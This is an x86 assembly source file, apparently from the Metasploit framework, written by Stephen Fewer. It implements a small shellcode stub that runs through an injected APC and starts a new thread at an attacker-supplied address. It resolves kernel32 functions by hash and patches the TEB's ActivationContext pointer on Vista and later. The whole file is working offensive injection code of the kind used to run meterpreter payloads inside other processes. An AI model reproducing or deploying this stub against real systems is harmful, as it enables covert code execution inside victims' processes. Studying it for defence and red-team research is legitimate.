;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Architecture: x86 (but not wow64)
; Version: 2.0 (March 2010)
; Size: 244 bytes
; Build: >build.py apc
;-----------------------------------------------------------------------------;

; A small stub to be used for thread injection where we gain execution via an injected APC. See the
; file "\msf3\external\source\meterpreter\source\common\arch\win\i386\base_inject.c" for more details

;typedef struct _APCCONTEXT
;{
; 	union
;	{
;		LPVOID lpStartAddress;
;		BYTE bPadding1[8]; 
;	} s;
;	union
;	{
; 		LPVOID lpParameter;
;		BYTE bPadding2[8];
;	} p;
;   BYTE bExecuted;
;} APCCONTEXT, * LPAPCCONTEXT;

[BITS 32]
[ORG 0]

  cld                      ; Clear the direction flag.
  mov esi, [esp+4]         ; ESI is a pointer to our apc stub context
  push ebp                 ; Prologue, save EBP...
  mov ebp, esp             ; And create a new stack frame
  call start               ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                     ;
%include "./src/block/block_api.asm" ;
start:                     ;
  pop ebx                  ; Pop off the address of 'api_call' for calling later.
  cmp byte [esi+16], 0     ; Has this context allready been injected
  jne cleanup              ; If so just leave this APC
  mov byte [esi+16], 1     ; Otherwise mark the context as executed and proceed
  push 0x9DBD95A6          ; hash( "kernel32.dll", "GetVersion" )
  call ebx                 ; GetVersion(); (AL will = major version and AH will = minor version)
  cmp al, byte 6           ; If we are not running on Windows Vista, 2008 or 7
  jl short continue        ; then continue to CreateThread... otherwise we must create a dummy thread ActivationContext
  xor ecx, ecx             ; zero ECX
  mov eax, [fs:ecx+24]     ; Get the current TEB
  cmp dword [eax+424], ecx ; Is the TEB ActivationContextStackPointer pointer NULL?
  jne continue             ; If there already is an ActivationContext structure setup, just continue
  lea edx, [ebx+context-delta] ; calculate the address of our dummy ActivationContext
  mov dword [eax+424], edx ; and set the address of our dummy ActivationContext in the current TEB
continue:
  xor ecx, ecx             ; Clear ECX
  push ecx                 ; lpThreadId 
  push ecx                 ; dwCreationFlags
  push dword [esi+8]       ; ctx->lpParameter
  push dword [esi]         ; ctx->lpStartAddress
  push ecx                 ; dwStackSize
  push ecx                 ; lpThreadAttributes
  push 0x160D6838          ; hash( "kernel32.dll", "CreateThread" )
  call ebx                 ; CreateThread( NULL, 0, ctx->lpStartAddress, ctx->lpParameter, 0, NULL );
cleanup:
  leave                    ; epilogue
  retn 12                  ; Return (cleaning up stack params) and finish our APC routine.
context:
  TIMES 0x18 db 0          ; An empty ntdll!_ACTIVATION_CONTEXT_STACK structure